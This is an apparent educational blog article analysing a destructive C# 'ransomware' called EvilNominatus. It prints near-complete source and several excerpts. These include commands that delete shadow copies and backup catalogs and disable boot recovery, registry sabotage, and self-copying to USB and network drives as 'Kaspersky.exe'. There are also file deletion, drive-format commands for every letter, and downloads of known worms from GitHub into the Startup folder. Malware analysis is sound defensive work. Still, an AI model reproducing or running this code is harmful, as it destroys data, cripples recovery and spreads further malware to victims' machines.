# 🛑 Analyzing a Malicious C# Code: The Rozbeh Ransomware 🛑

In this article, we dive into a dangerous piece of C# code named "EvilNominatus," identified as the Rozbeh Ransomware. This malware exhibits destructive behaviors, including file encryption, system sabotage, and self-propagation. Below, we analyze its key functionalities, illustrating each point with the relevant code snippets and explaining their implications. This analysis serves as an educational resource to understand malware techniques and emphasize the importance of cybersecurity.

> **⚠️ Warning**: This code is malicious and should not be executed. The analysis is for educational purposes only.

---

## 📜 Full Code Reference

Below is the complete source code provided for analysis. We will break down its critical components in the following sections.

```csharp
#define DEBUG
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Windows.Forms;
using Microsoft.Win32;

namespace EvilNominatus;

public class MainForm : Form
{
    private const uint GenericRead = 2147483648u;
    private const uint GenericWrite = 1073741824u;
    private const uint GenericExecute = 536870912u;
    private const uint GenericAll = 268435456u;
    private const uint FileShareRead = 1u;
    private const uint FileShareWrite = 2u;
    private const uint OpenExisting = 3u;
    private const uint FileFlagDeleteOnClose = 67108864u;
    private const uint MbrSize = 512u;

    public string myself = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);

    private IContainer components = null;
    private Label label1;
    private PictureBox pictureBox1;

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

    [DllImport("kernel32")]
    private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    [DllImport("kernel32")]
    private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

    public static void runCommand(string commands)
    {
        Process process = new Process();
        process.StartInfo = new ProcessStartInfo
        {
            FileName = "cmd.exe",
            Arguments = "/C " + commands,
            WindowStyle = ProcessWindowStyle.Hidden
        };
        process.Start();
        process.WaitForExit();
    }

    public static void deleteShadowCopies()
    {
        runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
    }

    public static void spread(string dp)
    {
        try
        {
            File.Copy(Assembly.GetExecutingAssembly().Location, dp + "Kaspersky.exe");
        }
        catch
        {
        }
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern void SleepL(int seconds);

    public MainForm()
    {
        InitializeComponent();
        checked
        {
            try
            {
                deleteShadowCopies();
                runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
                runCommand("wbadmin delete catalog -quiet");
                runCommand("assoc .exe=ENCRYPTEDFILE");
                runCommand("net stop security center");
                runCommand("START reg delete HKCR/.exe");
                runCommand("START reg delete HKCR/.dll");
                runCommand("START reg delete HKCR/*");
                runCommand("Rundll32 user32, SwapMouseButton");
                RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
                RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
                registryKey2.SetValue("Wallpaper", "", RegistryValueKind.String);
                RegistryKey registryKey3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
                registryKey3.SetValue("Shell", "empty", RegistryValueKind.String);
                DriveInfo[] drives = DriveInfo.GetDrives();
                foreach (DriveInfo driveInfo in drives)
                {
                    try
                    {
                        if (driveInfo.DriveType == DriveType.Removable || driveInfo.DriveType == DriveType.Network)
                        {
                            spread(driveInfo.Name.ToString());
                        }
                        if (driveInfo.Name.ToString() == "C:\\")
                        {
                            File.Delete("C:\\Users\\" + Environment.UserName);
                        }
                        else
                        {
                            Directory.Delete(driveInfo.Name.ToString());
                        }
                        string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                        string[] directories = Directory.GetDirectories(folderPath);
                        for (int j = 0; j < directories.Length; j++)
                        {
                            Directory.Delete(directories[j]);
                        }
                    }
                    catch
                    {
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Error " + ex.Message);
            }
            // ... (rest of the constructor code, including file overwrites, downloads, and system sabotage)
        }
    }

    public void OnCreated(object source, FileSystemEventArgs a)
    {
        try
        {
            string fullPath = a.FullPath;
            File.Delete(fullPath);
        }
        catch
        {
        }
    }

    public static void spread2(string dp)
    {
        try
        {
            File.Copy(Assembly.GetExecutingAssembly().Location, dp + "Kaspersky.exe");
        }
        catch
        {
        }
    }

    public static void Infect(string FILENAME1)
    {
        string directoryName = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
        byte[] bytes = File.ReadAllBytes(directoryName);
        File.WriteAllBytes(FILENAME1, bytes);
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && components != null)
        {
            components.Dispose();
        }
        ((Form)this).Dispose(disposing);
    }

    private void InitializeComponent()
    {
        ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(MainForm));
        pictureBox1 = new PictureBox();
        label1 = new Label();
        ((ISupportInitialize)pictureBox1).BeginInit();
        ((Control)this).SuspendLayout();
        pictureBox1.Image = (Image

)componentResourceManager.GetObject("pictureBox1.Image");
        ((Control)pictureBox1).Location = new Point(12, 12);
        ((Control)pictureBox1).Name = "pictureBox1";
        ((Control)pictureBox1).Size = new Size(227, 227);
        pictureBox1.TabIndex = 0;
        pictureBox1.TabStop = false;
        ((Control)label1).Font = new Font("Microsoft Sans Serif", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
        ((Control)label1).Location = new Point(283, 38);
        ((Control)label1).Name = "label1";
        ((Control)label1).Size = new Size(279, 217);
        ((Control)label1).TabIndex = 1;
        ((Control)label1).Text = "All your Files has been Encrypted by Rozbeh Ransomware 7\r\n\r\ncontact bkhtyaryrwzbh@gmail.com for more information\r\nhe made this Virus";
        ((ContainerControl)this).AutoScaleDimensions = new SizeF(6f, 13f);
        ((ContainerControl)this).AutoScaleMode = (AutoScaleMode)1;
        ((Control)this).BackColor = Color.Red;
        ((Form)this).ClientSize = new Size(624, 476);
        ((Control)this).Controls.Add((Control)(object)label1);
        ((Control)this).Controls.Add((Control)(object)pictureBox1);
        ((Control)this).Name = "MainForm";
        ((Control)this).Text = "EvilNominatus";
        ((ISupportInitialize)pictureBox1).EndInit();
        ((Control)this).ResumeLayout(false);
    }
}
```

---

## 🔍 Key Functionalities of the Malware

The code performs several malicious actions, ranging from disabling system recovery to spreading across drives and overwriting files. Below, we analyze each major functionality with the corresponding code snippets.

### 1. 🗑️ Disabling System Recovery and Shadow Copies

The malware begins by eliminating system recovery options, making it difficult for victims to restore their systems.

**Code Snippet**:
```csharp
public static void deleteShadowCopies()
{
    runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
}

public MainForm()
{
    deleteShadowCopies();
    runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
    runCommand("wbadmin delete catalog -quiet");
}
```

**Analysis**:
- **`deleteShadowCopies`**: Executes commands to delete all Volume Shadow Copies using `vssadmin` and `wmic`. Shadow Copies are backups that allow system restoration.
- **BCDEdit Commands**: Disables boot failure recovery (`bootstatuspolicy ignoreallfailures`) and turns off system recovery (`recoveryenabled no`).
- **WBAdmin**: Deletes the Windows Backup catalog, removing backup restoration options.
- **Impact**: Victims cannot use built-in Windows recovery tools to restore their system, increasing the ransomware's leverage.

### 2. 🦠 Self-Propagation Across Drives

The malware spreads by copying itself to removable and network drives, masquerading as "Kaspersky.exe" to appear legitimate.

**Code Snippet**:
```csharp
public static void spread(string dp)
{
    try
    {
        File.Copy(Assembly.GetExecutingAssembly().Location, dp + "Kaspersky.exe");
    }
    catch
    {
    }
}

public MainForm()
{
    DriveInfo[] drives = DriveInfo.GetDrives();
    foreach (DriveInfo driveInfo in drives)
    {
        try
        {
            if (driveInfo.DriveType == DriveType.Removable || driveInfo.DriveType == DriveType.Network)
            {
                spread(driveInfo.Name.ToString());
            }
        }
        catch
        {
        }
    }
}
```

**Analysis**:
- **`spread` Method**: Copies the malware executable to the root of specified drives, naming it "Kaspersky.exe" to deceive users into running it.
- **Drive Enumeration**: Targets removable (e.g., USB drives) and network drives, ensuring the malware spreads to other systems.
- **Error Handling**: Uses empty `catch` blocks to ignore errors, making the malware resilient to access restrictions.
- **Impact**: Facilitates rapid propagation across devices, increasing the malware’s reach.

### 3. 📂 File and Directory Destruction

The malware deletes critical files and directories, including user profiles and entire drives.

**Code Snippet**:
```csharp
public MainForm()
{
    DriveInfo[] drives = DriveInfo.GetDrives();
    foreach (DriveInfo driveInfo in drives)
    {
        try
        {
            if (driveInfo.Name.ToString() == "C:\\")
            {
                File.Delete("C:\\Users\\" + Environment.UserName);
            }
            else
            {
                Directory.Delete(driveInfo.Name.ToString());
            }
            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string[] directories = Directory.GetDirectories(folderPath);
            for (int j = 0; j < directories.Length; j++)
            {
                Directory.Delete(directories[j]);
            }
        }
        catch
        {
        }
    }
}
```

**Analysis**:
- **C: Drive Handling**: Attempts to delete the user’s profile directory (`C:\Users\<username>`).
- **Other Drives**: Deletes entire directories for non-C: drives, potentially wiping external or network storage.
- **User Profile Folders**: Deletes all subdirectories in the user’s profile (e.g., Documents, Desktop), causing significant data loss.
- **Impact**: Destroys user data and system-critical directories, rendering the system partially or fully inoperable.

### 4. 🔒 File Overwriting with Malicious Payload

The malware overwrites files with a fake "virus infection" message, simulating encryption or corruption.

**Code Snippet**:
```csharp
string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
string[] files = Directory.GetFiles(folderPath2);
foreach (string path in files)
{
    string[] contents = new string[1] { " 0xB7, 0x64, 0xB4, 0x4E, 0xBA, 0x34, 0x01, 0xCD, 0x21, 0x72, 0x1D, 0xBA, 0x9E, 0x00, 0xB8, 0x01, 0x3D, 0xCD, 0x21, 0x93, 0xBA, 0x00, 0x01, 0xB9, 0x56, 0x00, 0xB4, 0x40, 0xCD, 0x21, 0xB4, 0x3E, 0xCD, 0x21, 0xB4, 0x4F, 0xCD, 0x21, 0xEB, 0xE1, 0xBA, 0x38, 0x01, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x00, 0x4C, 0xCD, 0x21, 0x2A, 0x2E, 0x2A, 0x00, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x20, 0x49, 0x6E, 0x66, 0x65, 0x63, 0x74, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x61, 0x20, 0x56, 0x69, 0x72, 0x75, 0x73, 0x21, 0x0D, 0x0A, 0x24 " };
    File.WriteAllLines(path, contents);
}
```

**Analysis**:
- **Target Folders**: Overwrites files in critical directories such as Desktop, Fonts, Start Menu, and others, ensuring widespread damage.
- **Payload Structure**: The `contents` array contains a single string that is written to each file. This string can be broken down into two main parts:
  - **Assembly-Like Code**: The sequence `0xB7, 0x64, ..., ​​0x64, ..., 0x21` resembles 16-bit x86 assembly code, including opcodes and interrupts (`INT 21h`) typically used in DOS-based viruses. Specifically:
    - `0xB4, 0x4E` corresponds to `MOV AH, 4Eh`, which is the DOS function to find the first matching file.
    - `0xCD, 0x21` is the DOS interrupt `INT 21h`, used to invoke DOS services.
    - Other bytes like `0xBA, 0x34, 0x01` set registers (e.g., `DX` to an offset), and `0xEB, 0xE1` represents a jump instruction (`JMP`).
    - This sequence mimics the behavior of early file-infecting viruses that searched for files (e.g., `*.COM`) to infect.
    - **Purpose**: While this code appears functional, it is not executed in this context. Instead, it serves as a psychological tactic to intimidate users by suggesting a complex, destructive virus, even though the actual damage is caused by overwriting files with this text.
  - **Message and Terminators**: The latter part of the string contains ASCII bytes (`0x53, 0x79, 0x73, ...`) that spell out "System Infected by a Virus!" followed by a carriage return (`0x0D`), line feed (`0x0A`), and a dollar sign (`0x24`). The `$` is a common terminator in DOS string output functions, reinforcing the retro-virus aesthetic.
- **Execution Context**: The string is written to files using `File.WriteAllLines`, which treats the data as text. This means the file content becomes a human-readable string of comma-separated hex values and ASCII text, not executable machine code. For example, a text file might look like:
  ```
  0xB7, 0x64, 0xB4, 0x4E, ..., System Infected by a Virus!
  ```
  This corrupts the original file content, rendering it unusable without performing actual encryption.
- **Repetition**: The same payload is used across multiple folder iterations (Desktop, Fonts, Start Menu, etc.), ensuring consistent file corruption across the system.
- **Psychological Impact**: The use of assembly-like code and the ominous message is designed to scare users into believing their system is compromised by a sophisticated virus, prompting them to contact the provided email (`bkhtyaryrwzbh@gmail.com`) for assistance, likely leading to ransom demands or further scams.
- **Technical Limitations**: The payload does not perform encryption (despite the ransomware's claim). True ransomware typically uses cryptographic algorithms (e.g., AES, RSA) to lock files, requiring a decryption key. Here, the files are simply overwritten, meaning data recovery is impossible without backups, but no decryption is needed or offered.
- **Impact**: By overwriting files with this payload, the malware renders documents, images, and other critical files unusable. The simulated "infection" message heightens user panic, aligning with the ransomware's goal of coercion.

### 5. 🖥️ System Sabotage via Registry and Commands

The malware modifies the Windows Registry and executes commands to disable system functionalities.

**Code Snippet**:
```csharp
RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
registryKey2.SetValue("Wallpaper", "", RegistryValueKind.String);
RegistryKey registryKey3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
registryKey3.SetValue("Shell", "empty", RegistryValueKind.String);

runCommand("assoc .exe=ENCRYPTEDFILE");
runCommand("START reg delete HKCR/.exe");
runCommand("START reg delete HKCR/.dll");
runCommand("START reg delete HKCR/*");
runCommand("Rundll32 user32, SwapMouseButton");
```

**Analysis**:
- **Registry Modifications**:
  - Disables Task Manager (`DisableTaskMgr`).
  - Removes the desktop wallpaper (`Wallpaper` set to empty).
  - Sets the Windows shell to "empty," potentially preventing the desktop from loading.
- **File Associations**: Changes `.exe` files to `ENCRYPTEDFILE`, disrupting executable functionality.
- **Registry Deletion**: Deletes file association keys for `.exe`, `.dll`, and all extensions (`HKCR/*`), breaking application launching.
- **Mouse Button Swap**: Reverses mouse buttons to confuse users.
- **Impact**: Severely impairs system usability, making recovery without external tools challenging.

### 6. 🌐 Downloading Additional Malware

The malware downloads and executes additional malicious scripts from GitHub repositories.

**Code Snippet**:
```csharp
using (WebClient webClient = new WebClient())
{
    webClient.DownloadFile("https://raw.githubusercontent.com/onx/ILOVEYOU/master/LOVE-LETTER-FOR-YOU.TXT.vbs", "Antivirus.VBS");
    webClient.DownloadFile("https://raw.githubusercontent.com/Da2dalus/The-MALWARE-Repo/master/Worm/HeadTail.vbs", "Kaspersky.VBS");
    webClient.DownloadFile("https://raw.githubusercontent.com/MalDev101/Loveware/master/Loveware/Loveware.bat", "ANTIVIRUS.bat");
}
File.Copy("Antivirus.vbs", folderPath9);
File.Copy("ANTIVIRUS.BAT", folderPath9);
File.Copy("Kaspersky.VBS", folderPath9);
```

**Analysis**:
- **Downloads**: Retrieves VBS and BAT files, including variants of the infamous ILOVEYOU worm and other malware.
- **Persistence**: Copies these files to the Startup folder, ensuring they run on system boot.
- **Deception**: Names files to mimic antivirus software (e.g., "Kaspersky.VBS"), tricking users into executing them.
- **Impact**: Introduces additional malware, compounding the infection and potential damage.

### 7. 💾 Formatting Drives

The malware attempts to format all drives, which would erase all data.

**Code Snippet**:
```csharp
runCommand("format  A: /FS:NTFS /X /Q /y");
runCommand("format  B: /FS:NTFS /X /Q /y");
runCommand("format  C: /FS:NTFS /X /Q /y");
// ... (commands for drives D: to Z:)
```

**Analysis**:
- **Format Commands**: Attempts to format all drives (A: to Z:) with NTFS, using `/Q` for quick formatting and `/y` to suppress confirmation prompts.
- **Impact**: If successful, this would wipe all data on the targeted drives, causing catastrophic data loss. However, administrative privileges and system protections may prevent this on the C: drive.

### 8. 👀 File System Monitoring and Deletion

The malware sets up file system watchers to delete newly created files.

**Code Snippet**:
```csharp
string folderPath10 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
FileSystemWatcher fileSystemWatcher = new FileSystemWatcher();
fileSystemWatcher.Path = folderPath10;
fileSystemWatcher.IncludeSubdirectories = true;
fileSystemWatcher.InternalBufferSize = 1000000;
fileSystemWatcher.Created += OnCreated;

public void OnCreated(object source, FileSystemEventArgs a)
{
    try
    {
        string fullPath = a.FullPath;
        File.Delete(fullPath);
    }
    catch
    {
    }
}
```

**Analysis**:
- **FileSystemWatcher**: Monitors the Desktop and User Profile directories for new files.
- **`OnCreated` Handler**: Deletes any file created in these directories, preventing users from saving new data.
- **Impact**: Continuously disrupts user activities, making the system nearly unusable.

---

## 🛡️ Implications and Mitigation

### Implications
- **Data Loss**: The malware deletes files, overwrites them with junk data, and attempts to format drives, leading to irreversible data loss.
- **System Disruption**: Disabling recovery, Task Manager, and file associations renders the system inoperable.
- **Propagation**: Spreading to removable and network drives increases the malware’s reach across devices.
- **Additional Threats**: Downloading external malware introduces unpredictable risks, such as worms or backdoors.

### Mitigation Strategies
- **Antivirus Software**: Use reputable antivirus tools to detect and quarantine the malware before execution.
- **Backups**: Maintain regular, offline backups to restore data after an attack.
- **Least Privilege**: Run systems with minimal permissions to limit the malware’s ability to modify critical components.
- **Network Segmentation**: Isolate infected systems to prevent propagation to network drives.
- **Education**: Train users to recognize suspicious files (e.g., "Kaspersky.exe" on a USB drive).

---

## 🏁 Conclusion

The Rozbeh Ransomware, disguised as "EvilNominatus," is a textbook example of destructive malware. By combining file destruction, system sabotage, and self-propagation, it poses a severe threat to infected systems. Understanding its techniques—such as shadow copy deletion, registry manipulation, and drive formatting—helps developers and security professionals build better defenses. Always exercise caution with unknown executables and maintain robust security practices to stay safe.

> **Note**: If you encounter this malware, do not contact the provided email (`bkhtyaryrwzbh@gmail.com`). Instead, isolate the infected system and seek professional cybersecurity assistance.

Stay vigilant! 🛡️